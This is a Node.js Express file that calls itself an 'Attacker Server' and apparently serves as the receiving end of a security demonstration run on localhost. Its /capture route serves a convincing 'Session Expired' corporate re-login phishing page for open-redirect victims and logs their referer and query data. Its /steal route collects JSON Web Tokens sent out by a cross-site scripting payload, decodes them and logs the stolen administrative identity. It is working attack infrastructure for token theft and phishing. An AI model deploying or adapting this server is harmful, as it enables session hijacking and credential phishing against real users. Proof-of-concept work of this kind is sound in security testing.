const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());

// Pagina de captura phishing (dovada Open Redirect)
app.get('/capture', (req, res) => {
  const referer = req.get('Referer') || req.get('Referrer') || '(none)';
  console.log('\n========== OPEN REDIRECT CAPTURE ==========');
  console.log('Victim landed on attacker server (phishing page).');
  console.log('Referer:', referer);
  console.log('Query params:', JSON.stringify(req.query, null, 2));
  console.log('============================================\n');

  // UI phishing realist
  res.send(`
    <html>
      <head>
        <style>
          body { font-family: sans-serif; background: #f1f5f9; display: flex; justify-content: center; padding-top: 50px; }
          .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
          h2 { color: #1e293b; }
          p { color: #64748b; font-size: 14px; }
          .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #2563eb; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          .btn { background: #2563eb; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block; margin-top: 10px; }
        </style>
      </head>
      <body>
        <div class="box">
          <h2>Session Expired</h2>
          <div class="spinner"></div>
          <p>Your corporate session has timed out for security reasons. Please re-authenticate to continue your work.</p>
          <a href="http://localhost:3000" class="btn">Login Again</a>
        </div>
      </body>
    </html>
  `);
});

app.get('/steal', (req, res) => {
  const token = req.query.token;
  console.log('\n========== STOLEN JWT (XSS) ==========');
  if (token) {
    try {
      const payloadPart = token.split('.')[1];
      const payload = payloadPart
        ? JSON.parse(Buffer.from(payloadPart, 'base64').toString())
        : null;
      if (payload) {
        console.log('Decoded payload:', JSON.stringify(payload, null, 2));
        console.log('SUCCESS: Administrative access to:', payload.name, '| role:', payload.role);
      } else {
        console.log('ENCODED (not JWT):', token);
      }
    } catch (e) {
      console.log('Token received but not decodable as JWT:', token);
    }
  } else {
    console.log('No token received.');
  }
  console.log('=========================================\n');
  res.send('ok');
});

app.listen(PORT, () => {
  console.log(`[Attacker Server] Running at http://localhost:${PORT}`);
});
